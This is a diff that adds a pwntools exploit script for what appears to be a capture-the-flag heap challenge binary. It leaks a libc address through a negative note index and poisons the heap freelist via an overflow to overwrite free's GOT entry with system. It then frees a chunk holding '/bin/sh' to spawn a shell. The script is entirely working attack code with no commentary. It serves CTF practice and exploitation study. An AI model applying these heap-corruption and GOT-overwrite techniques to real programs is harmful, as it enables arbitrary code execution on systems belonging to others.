@@ -1,0 +1,52 @@
+from pwn import *
+
+e = ELF("./chall1_patched")
+libc = ELF("./libc-2.31.so")
+
+p = process("./chall1_patched")
+'''
+p = gdb.debug("./chall1_patched", gdbscript = 
+b *add_note + 255
+)
+'''
+def add_note(index, size, data):
+    p.sendlineafter(b"> ", b"1")
+    p.sendlineafter(b"Index: ", f"{index}".encode())
+    p.sendlineafter(b"Size: ", f"{size}".encode())
+    p.sendafter(b"Data: ", data)
+
+def edit_note(index, data):
+    p.sendlineafter(b"> ", b"2")
+    p.sendlineafter(b"Index: ", f"{index}".encode())
+    p.sendafter(b"Data: ", data)
+  
+def remove_note(index):
+    p.sendlineafter(b"> ", b"3")
+    p.sendlineafter(b"Index: ", f"{index}".encode())
+
+def read_note(index):
+    p.sendlineafter(b"> ", b"4")
+    p.sendlineafter(b"Index: ", f"{index}".encode())
+
+add_note(0, 0x10, b"A" * 8)
+add_note(1, 0x10, b"A" * 8)
+add_note(2, 0x10, b"A" * 8)
+add_note(-4, 0x10, b"A" * 8)
+remove_note(2)
+remove_note(1)
+
+free_got = e.got['free']
+edit_note(0, b"A" * 0x8 + p64(0) * 2 + p64(0x21) + p64(free_got))
+
+read_note(-1854)
+p.recvuntil(b"Data: ")
+libc_base = u64(p.recvline()[:-1:].ljust(8, b"\x00")) - libc.symbols['puts']
+print(hex(libc_base))
+
+system = libc_base + libc.symbols['system']
+puts = libc_base + libc.symbols['puts']
+add_note(1, 0x10, b"/bin/sh\x00")
+add_note(2, 0x10, p64(system) + p64(puts))
+remove_note(1)
+
+p.interactive()
